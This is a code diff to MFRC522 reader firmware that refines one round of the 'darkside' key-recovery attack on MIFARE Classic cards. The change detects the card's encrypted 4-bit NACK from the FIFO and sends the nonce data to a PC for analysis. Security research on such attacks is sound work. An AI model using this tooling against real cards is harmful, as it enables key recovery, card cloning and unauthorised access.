@@ -689,10 +689,24 @@ static void do_darkside_round(void) {
     mfrc522_clear_bit(TxModeReg, 0x80);
     mfrc522_clear_bit(RxModeReg, 0x80);
 
+    // Detect 4-bit NACK.  The card's NACK is encrypted, so the MFRC522
+    // flags a parity error and mfrc522_to_card() returns MI_ERR even
+    // though valid data was received.  Check the FIFO directly.
+    uint8_t got_nack = 0;
     if (status == MI_OK && back_len == 4) {
-        // Got 4-bit NACK — parity matched!
+        got_nack = 1;  // clean reception (rare but possible)
+    } else if (status == MI_ERR) {
+        // Card may have sent encrypted NACK — check FIFO for 4-bit data
+        uint8_t fifo_n = mfrc522_read_reg(FIFOLevelReg);
+        uint8_t last_bits = mfrc522_read_reg(ControlReg) & 0x07;
+        if (fifo_n >= 1 && last_bits == 4) {
+            resp_buf[0] = mfrc522_read_reg(FIFODataReg);
+            got_nack = 1;
+        }
+    }
+
+    if (got_nack) {
         uart_puts("DARK:NACK:");
-        // Send the nr,ar we used so PC can analyze
         for (uint8_t i = 0; i < 8; i++) uart_put_hex(fake_response[i]);
         uart_puts("\r\n");
     } else {
